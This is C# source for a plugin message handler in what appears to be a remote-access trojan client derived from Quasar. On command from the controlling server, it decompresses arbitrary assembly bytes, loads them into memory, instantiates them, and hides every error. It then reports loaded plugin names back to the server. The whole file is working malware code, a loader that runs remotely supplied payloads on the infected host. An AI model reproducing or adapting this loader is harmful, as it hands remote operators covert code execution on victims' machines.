

using System;
using System.Collections.Generic;
using InvokedClient.Helper;
using InvokedClient.Networking;
using InvokedCommon.Messages;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class PluginHandler : IMessageProcessor
	{
		private readonly QuasarClient _client;
		private readonly InvokedClientApplication _InvokedClientAppReference;

		public PluginHandler(QuasarClient client, InvokedClientApplication InvokedClientApp)
		{
			this._client = client;
			this._InvokedClientAppReference = InvokedClientApp;
		}

		public bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case DoPlugin _:
				case CheckPlugin _:
					return true;
				default:
					return message is GetLoadedPlugins;
			}
		}

		public bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case DoPlugin message1:
					this.Execute(sender, message1);
					break;
				case CheckPlugin message2:
					this.Execute(sender, message2);
					break;
				case GetLoadedPlugins message3:
					this.Execute(sender, message3);
					break;
			}
		}

		public void CallbackMethod(IMessageProcessor MP, string MPName)
		{
			this._InvokedClientAppReference.AddMessageProcessor(MP, MPName);
			this._client.Send<PluginLoadedResponse>(new PluginLoadedResponse()
			{
				PluginName = MPName
			});
			this._client.Send<CheckPluginResponse>(new CheckPluginResponse()
			{
				PluginName = MPName,
				Status = true
			});
		}

		private void Execute(ISender client, DoPlugin message)
		{
			if (message.MsgpackData != null)
			{
				try
				{
					byte[] data = Zip.Decompress(message.MsgpackData);
					Activator.CreateInstance(AppDomain.CurrentDomain.Load(data).GetType("Plugin.Plugin"));
				}
				catch (Exception)
				{
				}
			}
			else
			{
				try
				{
					string pluginName = message.PluginName;
					byte[] decompressed = Zip.Decompress(message.Data);
					Type pluginType = AppDomain.CurrentDomain.Load(decompressed).GetType("Plugin.Plugin");
					dynamic instance = Activator.CreateInstance(pluginType);
					Action<IMessageProcessor, string> action = CallbackMethod;
					instance.ExecuteCallback(action, pluginName);
				}
				catch (Exception)
				{
				}
			}
		}

		private void Execute(ISender client, CheckPlugin message)
		{
			bool flag = this._InvokedClientAppReference.CheckMessageProcessor(message.PluginName);
			client.Send<CheckPluginResponse>(new CheckPluginResponse()
			{
				PluginName = message.PluginName,
				Status = flag
			});
		}

		private void Execute(ISender client, GetLoadedPlugins message)
		{
			List<string> stringList = new List<string>();
			foreach (string messageProcessorName in this._InvokedClientAppReference._loadedPluginMessageProcessorNames)
				stringList.Add(messageProcessorName);
			client.Send<GetLoadedPluginsResponse>(new GetLoadedPluginsResponse()
			{
				PluginNames = stringList
			});
		}
	}
}